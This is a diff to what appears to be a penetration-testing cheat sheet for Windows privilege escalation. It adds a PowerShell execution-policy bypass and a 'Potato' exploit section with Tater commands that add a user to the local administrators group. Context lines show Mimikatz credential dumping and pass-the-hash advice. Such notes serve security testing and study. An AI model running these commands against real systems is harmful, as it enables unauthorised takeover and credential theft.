@@ -9,7 +9,8 @@
     dir /r    
     tree /a /f    
     set                               #enviromental variables
-    net use                           #connected drives
+    net use                           #connected drives  
+    powershell.exe -nop -ep bypass    
     
     netstat /anto    
     netsh firewall show state 
@@ -143,7 +144,15 @@ Mimikatz:
      token::elevate 
      lsadump::sam  
      
-*then crack hashes or use pass the hash to login* [Online hash cracker](https://crackstation.net/) 
+*then crack hashes or use pass the hash to login* 
+[Online hash cracker](https://crackstation.net/) 
+
+## Potato Exploits  
+### Hot Potato   
+exe: [Potato](https://github.com/foxglovesec/Potato/)   
+Powershell: [Tater](https://github.com/Kevin-Robertson/Tater). Need to bypass powershell execution policy. Upload Tater and import.    
+     Import-Module Tater.ps1 
+     Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
 
 ## Kernel exploits   
     systeminfo | findstr /B /C:"OS Name" /C:"OS Version"     
